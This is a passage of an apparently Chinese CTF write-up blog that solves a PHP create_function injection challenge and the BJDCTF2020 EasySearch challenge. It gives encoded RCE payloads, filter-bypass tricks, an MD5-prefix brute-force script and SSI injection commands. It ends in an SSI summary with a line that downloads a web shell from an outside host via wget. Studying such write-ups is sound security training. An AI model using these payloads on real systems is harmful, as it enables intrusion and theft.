src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201209180141835.png" srcset="/img/loading.gif" alt="image-20201209180141835"></p><pre class=" language-php"><code class="language-php"><span class="token variable">$lambda1</span><span class="token operator">=</span><span class="token string">"return ln($a)+ln($b)"</span>"<span class="token punctuation">;</span><span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string">'$a,$b'</span><span class="token punctuation">,</span><span class="token variable">$lambda_1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>等价于<span class="token keyword">function</span> <span class="token function">lambda1</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token string">"ln($a)+ln($b)"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>那么如果$lamdba_1=return $a+$b;}eval($_POST[‘cmd’];\\</p><p>执行时就会变成，可以RCE了。</p><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">lambda1</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token variable">$a</span><span class="token operator">+</span><span class="token variable">$b</span><span class="token punctuation">;</span><span class="token punctuation">}</span>    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//}</span></code></pre><p>正好里有个extract()</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201209203444303.png" srcset="/img/loading.gif" alt="image-20201209203444303"></p><p>那就像这样构造：</p><pre><code>flag[code]=create_function&amp;flag[arg]=;}function();//</code></pre><p>然后开始看大师傅的wp，哎</p><p>我忽略了这个地方，代码里写了包含flag.php。</p><p>既然包含了，那不用去直接读flag.php也可以得到flag。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201209205501327.png" srcset="/img/loading.gif" alt="image-20201209205501327"></p><p>这时候就需要一个函数，可以输出所有变量的值：get_defined_vars()</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201209205832375.png" srcset="/img/loading.gif" alt="image-20201209205832375"></p><p>那么结合上面所有的可以这样构造payload:</p><pre class=" language-php"><code class="language-php"><span class="token operator">?</span>debu<span class="token operator">=</span>debu_is_cute<span class="token operator">%</span><span class="token constant">0A</span><span class="token operator">&amp;</span>file<span class="token operator">=</span>data<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//text/plain,debu_debu_aqua&amp;shana[]=1&amp;passwd[]=2&amp;flag[code]=create_function&amp;flag[arg]=;}var_dump(get_defined_vars());//</span>post<span class="token punctuation">:</span>debu<span class="token operator">=</span><span class="token number">1</span>file<span class="token operator">=</span><span class="token number">1</span><span class="token operator">--</span><span class="token operator">></span><span class="token property">url</span>编码后得到<span class="token operator">%</span><span class="token number">64</span><span class="token operator">%</span><span class="token number">65</span><span class="token operator">%</span><span class="token number">62</span><span class="token operator">%</span><span class="token number">75</span><span class="token operator">=</span><span class="token operator">%</span><span class="token number">61</span><span class="token operator">%</span><span class="token number">71</span><span class="token operator">%</span><span class="token number">75</span><span class="token operator">%</span>61_is_<span class="token operator">%</span><span class="token number">63</span><span class="token operator">%</span><span class="token number">75</span><span class="token operator">%</span><span class="token number">74</span><span class="token operator">%</span><span class="token number">65</span><span class="token operator">%</span><span class="token constant">0A</span><span class="token operator">&amp;</span>file<span class="token operator">=</span>data<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//text/plain,%64%65%62%75_%64%65%62%75_%61%71%75%61&amp;%73%68%61%6e%61[]=1&amp;%70%61%73%73%77%64[]=2&amp;%66%6c%61%67[%63%6f%64%65]=create_function&amp;%66%6c%61%67[%61%72%67]=;}var_dump(get_defined_vars());//</span></code></pre><p>传入得到，…哦这flag还在另一个文件里</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201210121141285.png" srcset="/img/loading.gif" alt="image-20201210121141285"></p><p>继续学习读文件的姿势。</p><p>虽然得到了一个新的文件，但我们依然可以用get_defined_vars读取变量的值。只要把rea1fl4g.php包含进来就可以达成目的。</p><p>由于include,单双引号, . 还有一些flag关键词都被过滤，用base64编码即可绕过。</p><pre class=" language-php"><code class="language-php"><span class="token keyword">require</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span>cmVhMWZsNGcucGhw<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//rea1fl4g.php</span></code></pre><p>payload</p><pre class=" language-php"><code class="language-php">debu<span class="token operator">=</span>debu_is_cute<span class="token operator">%</span><span class="token constant">0A</span><span class="token operator">&amp;</span>file<span class="token operator">=</span>data<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//text/plain,debu_debu_aqua&amp;shana[]=1&amp;passwd[]=2&amp;flag[code]=create_function&amp;flag[arg]=;}require(base64_decode(cmVhMWZsNGcucGhw));var_dump(get_defined_vars());//</span><span class="token operator">%</span><span class="token number">64</span><span class="token operator">%</span><span class="token number">65</span><span class="token operator">%</span><span class="token number">62</span><span class="token operator">%</span><span class="token number">75</span><span class="token operator">=</span><span class="token operator">%</span><span class="token number">61</span><span class="token operator">%</span><span class="token number">71</span><span class="token operator">%</span><span class="token number">75</span><span class="token operator">%</span>61_is_<span class="token operator">%</span><span class="token number">63</span><span class="token operator">%</span><span class="token number">75</span><span class="token operator">%</span><span class="token number">74</span><span class="token operator">%</span><span class="token number">65</span><span class="token operator">%</span><span class="token constant">0A</span><span class="token operator">&amp;</span>file<span class="token operator">=</span>data<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//text/plain,%64%65%62%75_%64%65%62%75_%61%71%75%61&amp;%73%68%61%6e%61[]=1&amp;%70%61%73%73%77%64[]=2&amp;%66%6c%61%67[%63%6f%64%65]=create_function&amp;%66%6c%61%67[%61%72%67]=;}require(%62%61%73%65%36%34_%64%65%63%6f%64%65(cmVhMWZsNGcucGhw));var_dump(get_defined_vars());//</span></code></pre><p>相似的，还有很多种方法：</p><p>比如可以用异或：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?</span><span class="token comment" spellcheck="true">//Author: 颖奇L'Amore</span><span class="token comment" spellcheck="true">//Blog: www.gem-love.com</span><span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string">"r e a 1 f l 4 g . p h p"</span><span class="token punctuation">;</span><span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$arr</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"%"</span><span class="token punctuation">.</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token string">"^"</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$arr</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"%ff"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>payload</p><pre class=" language-php"><code class="language-php"><span class="token operator">%</span><span class="token number">64</span><span class="token operator">%</span><span class="token number">65</span><span class="token operator">%</span><span class="token number">62</span><span class="token operator">%</span><span class="token number">75</span><span class="token operator">=</span><span class="token operator">%</span><span class="token number">61</span><span class="token operator">%</span><span class="token number">71</span><span class="token operator">%</span><span class="token number">75</span><span class="token operator">%</span>61_is_<span class="token operator">%</span><span class="token number">63</span><span class="token operator">%</span><span class="token number">75</span><span class="token operator">%</span><span class="token number">74</span><span class="token operator">%</span><span class="token number">65</span><span class="token operator">%</span><span class="token constant">0A</span><span class="token operator">&amp;</span>file<span class="token operator">=</span>data<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//text/plain,%64%65%62%75_%64%65%62%75_%61%71%75%61&amp;%73%68%61%6e%61[]=1&amp;%70%61%73%73%77%64[]=2&amp;%66%6c%61%67[%63%6f%64%65]=create_function&amp;%66%6c%61%67[%61%72%67]=;}require(%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f^%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">get_defined_vars</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//</span></code></pre><p>也可以用取反：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?</span><span class="token comment" spellcheck="true">//Author: 颖奇L'Amore</span><span class="token comment" spellcheck="true">//Blog: www.gem-love.com</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">"r e a 1 f l 4 g . p h p"</span><span class="token punctuation">;</span><span class="token variable">$arr1</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br>~("</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$arr1</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"%"</span><span class="token punctuation">.</span><span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token string">")&lt;br>"</span><span class="token punctuation">;</span></code></pre><p>payload</p><pre class=" language-php"><code class="language-php"><span class="token operator">?</span><span class="token operator">%</span><span class="token number">64</span><span class="token operator">%</span><span class="token number">65</span><span class="token operator">%</span><span class="token number">62</span><span class="token operator">%</span><span class="token number">75</span><span class="token operator">=</span><span class="token operator">%</span><span class="token number">61</span><span class="token operator">%</span><span class="token number">71</span><span class="token operator">%</span><span class="token number">75</span><span class="token operator">%</span>61_is_<span class="token operator">%</span><span class="token number">63</span><span class="token operator">%</span><span class="token number">75</span><span class="token operator">%</span><span class="token number">74</span><span class="token operator">%</span><span class="token number">65</span><span class="token operator">%</span><span class="token constant">0A</span><span class="token operator">&amp;</span>file<span class="token operator">=</span>data<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//text/plain,%64%65%62%75_%64%65%62%75_%61%71%75%61&amp;%73%68%61%6e%61[]=1&amp;%70%61%73%73%77%64[]=2&amp;%66%6c%61%67[%63%6f%64%65]=create_function&amp;%66%6c%61%67[%61%72%67]=;}require(~(%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f));var_dump(get_defined_vars());//</span></code></pre><hr><p>但是！以上都是原题中的做法！这道题过滤了^,异或用不得。而且即使你用取反读到了，哈哈没想到吧还是假flag。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201210135159843.png" srcset="/img/loading.gif" alt="image-20201210135159843"></p><h2 id="方法一-利用require本地包含"><a href="#方法一-利用require本地包含" class="headerlink" title="方法一  利用require本地包含"></a><strong>方法一  利用require本地包含</strong></h2><p>正解是require里套个编码过的伪协议。也就是用require()本地包含加伪协议读源码。</p><p>最终payload:</p><pre class=" language-php"><code class="language-php"><span class="token operator">?</span>debu<span class="token operator">=</span>aqua_is_cute<span class="token operator">%</span><span class="token constant">0A</span><span class="token operator">&amp;</span>file<span class="token operator">=</span>data<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//text/plain,debu_debu_aqua&amp;shana[]=1&amp;passwd[]=2&amp;flag[code]=create_function&amp;flag[arg]=;}require(php://filter/read=convert.base64-encode/resource=rea1fl4g.php);var_dump(get_defined_vars());//</span><span class="token operator">--</span><span class="token operator">></span>编码<span class="token operator">?</span><span class="token operator">%</span><span class="token number">64</span><span class="token operator">%</span><span class="token number">65</span><span class="token operator">%</span><span class="token number">62</span><span class="token operator">%</span><span class="token number">75</span><span class="token operator">=</span><span class="token operator">%</span><span class="token number">61</span><span class="token operator">%</span><span class="token number">71</span><span class="token operator">%</span><span class="token number">75</span><span class="token operator">%</span>61_is_<span class="token operator">%</span><span class="token number">63</span><span class="token operator">%</span><span class="token number">75</span><span class="token operator">%</span><span class="token number">74</span><span class="token operator">%</span><span class="token number">65</span><span class="token operator">%</span><span class="token constant">0A</span><span class="token operator">&amp;</span>file<span class="token operator">=</span>data<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//text/plain,%64%65%62%75_%64%65%62%75_%61%71%75%61&amp;%73%68%61%6e%61[]=1&amp;%70%61%73%73%77%64[]=2&amp;%66%6c%61%67[%63%6f%64%65]=create_function&amp;%66%6c%61%67[%61%72%67]=;}require(~(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f));//</span></code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201210134954382.png" srcset="/img/loading.gif" alt="image-20201210134954382"></p><h2 id="方法二-define-fopen-fgets"><a href="#方法二-define-fopen-fgets" class="headerlink" title="方法二 define+fopen ()+fgets ()"></a>方法二 define+fopen ()+fgets ()</h2><p>fopen()和fgets()都没被过滤，但$被ban了。这里直接用define定义了个常量，学到了学到了。</p><p>payload</p><pre><code>define(aaa,fopen(~(%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f),r))；while(!feof(aaa))var_dump(fgets(aaa));fclose(aaa);</code></pre><h2 id="方法三-数组操作"><a href="#方法三-数组操作" class="headerlink" title="方法三 数组操作"></a>方法三 数组操作</h2><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201210151809955.png" srcset="/img/loading.gif" alt="image-20201210151809955"></p><pre class=" language-php"><code class="language-php">flag<span class="token punctuation">[</span>arg<span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token keyword">require</span><span class="token punctuation">(</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token function">pos</span><span class="token punctuation">(</span><span class="token function">get_defined_vars</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//&amp;flag[code]=create_function&amp;abc=php://filter/convert.base64-encode/resource=rea1fl4g.php</span>post<span class="token punctuation">:</span>abc<span class="token operator">=</span><span class="token number">1</span></code></pre><p>师傅的wp说的很清晰了。</p><p>同理，还有这种</p><pre><code>rce=php://filter/read=convert.base64-encode/resource=rea1fl4g.php&amp;flag[arg]=;}require(get_defined_vars()[_GET][rce]);//</code></pre><blockquote><p>参考：<a href="https://www.gem-love.com/ctf/770.html" target="_blank" rel="noopener">https://www.gem-love.com/ctf/770.html</a></p></blockquote><h1 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h1><p>考点：vim泄露；爆破；SSI注入。</p><p>一个简单的登录页面，输入错误只会弹failed。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201210162622123.png" srcset="/img/loading.gif" alt="image-20201210162622123"></p><p>扫了下后台，vim泄露，访问得到源码。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201210162435387.png" srcset="/img/loading.gif" alt="image-20201210162435387"></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">get_hash</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$chars</span> <span class="token operator">=</span> <span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-'</span><span class="token punctuation">;</span>        <span class="token variable">$random</span> <span class="token operator">=</span> <span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//Random 5 times</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token variable">$random</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-Type: text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">''</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$admin</span> <span class="token operator">=</span> <span class="token string">'6d0bc1'</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$admin</span> <span class="token operator">==</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"&lt;script>alert('[+] Welcome to manage system')&lt;/script>"</span><span class="token punctuation">;</span>            <span class="token variable">$file_shtml</span> <span class="token operator">=</span> <span class="token string">"public/"</span><span class="token punctuation">.</span><span class="token function">get_hash</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">".shtml"</span><span class="token punctuation">;</span>            <span class="token variable">$shtml</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$file_shtml</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Unable to open file!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$text</span> <span class="token operator">=</span> '            <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>            <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span></span>Hello<span class="token punctuation">,</span><span class="token string">'.$_POST['</span>username<span class="token string">'].'</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span>            <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>            <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>'<span class="token punctuation">;</span>            <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$shtml</span><span class="token punctuation">,</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$shtml</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>            <span class="token keyword">echo</span> <span class="token string">"[!] Header  error ..."</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"&lt;script>alert('[!] Failed')&lt;/script>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span>    <span class="token punctuation">{</span>    <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>    <span class="token punctuation">}</span>    <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token delimiter">?></span></code></pre><p>admin的值是6d0bc1，爆个破找个passwd出来。结果是2020666。</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> hashlib<span class="token keyword">import</span> threading<span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">999999999</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">"6d0bc1"</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>            <span class="token keyword">break</span>thread <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>run<span class="token punctuation">)</span>thread<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>登录进来了，一开始以为啥都没有。结果这有个header的提示。那估计是头里有东西。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201210170558095.png" srcset="/img/loading.gif" alt="image-20201210170558095"></p><p>果然 Url_is_here: public/372fda1bdfbe9027365d54258d00222630c2af50.shtml</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201210170640569.png" srcset="/img/loading.gif" alt="image-20201210170640569"></p><p>访问一下。再回头看这段源码。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201210170848312.png" srcset="/img/loading.gif" alt="image-20201210170848312"></p><p>这里实际上对username没有要求，并且它可控。诶, html+rce=ssi。</p><pre class=" language-php"><code class="language-php">    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">''</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$admin</span> <span class="token operator">=</span> <span class="token string">'6d0bc1'</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$admin</span> <span class="token operator">==</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"&lt;script>alert('[+] Welcome to manage system')&lt;/script>"</span><span class="token punctuation">;</span>            <span class="token variable">$file_shtml</span> <span class="token operator">=</span> <span class="token string">"public/"</span><span class="token punctuation">.</span><span class="token function">get_hash</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">".shtml"</span><span class="token punctuation">;</span>            <span class="token variable">$shtml</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$file_shtml</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Unable to open file!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$text</span> <span class="token operator">=</span> '            <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>            <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span></span>Hello<span class="token punctuation">,</span><span class="token string">'.$_POST['</span>username<span class="token string">'].'</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span>            <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>            <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>'<span class="token punctuation">;</span>            <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$shtml</span><span class="token punctuation">,</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$shtml</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>            <span class="token keyword">echo</span> <span class="token string">"[!] Header  error ..."</span><span class="token punctuation">;</span></code></pre><p>那么传入</p><p>username=<!--#exec cmd="ls /" --></p><p>passwd=2020666</p><p>再访问如下的url,rce成功。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201210174108354.png" srcset="/img/loading.gif" alt="image-20201210174108354"></p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201210174142583.png" srcset="/img/loading.gif" alt="image-20201210174142583"></p><p>找了找，在../下。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201210174356471.png" srcset="/img/loading.gif" alt="image-20201210174356471"></p><p>payload</p><pre><code>username=%3C%21--%23exec+cmd%3D%22cat%20../flag_990c66bf85a09c664f0b6741840499b2%22+--%3E&amp;password=2020666</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201210174544128.png" srcset="/img/loading.gif" alt="image-20201210174544128"></p><h2 id="SSI注入总结"><a href="#SSI注入总结" class="headerlink" title="SSI注入总结"></a>SSI注入总结</h2><p>SSI注入全称Server-Side Includes Injection，即服务端包含注入。在stm、shtm、shtml等Web页面中，如果用户可以从外部输入SSI标签，而输入的内容会显示到上述后缀的Web页面时，就导致可以远程在Web应用中注入脚本来执行代码。</p><p><strong>前提条件</strong></p><p>1.开启SSI</p><p>2.WEB应用程序返回HTML界面时，嵌入用户输入的内容。</p><p>3.对用户输入没有有效过滤。</p><p><strong>命令执行</strong></p><pre class=" language-html"><code class="language-html"><span class="token comment" spellcheck="true">&lt;!--#exec cmd="ls" --></span></code></pre><p><strong>脚本</strong></p><pre class=" language-html"><code class="language-html"><span class="token comment" spellcheck="true">&lt;!--#exec cmd="wget http://mysite.com/shell.txt | rename shell.txt shell.php" --></span></code></pre><p><strong>访问/设置服务器信息</strong> </p><p>更改错误消息输出：</p><pre class=" language-html"><code class="language-html"><span 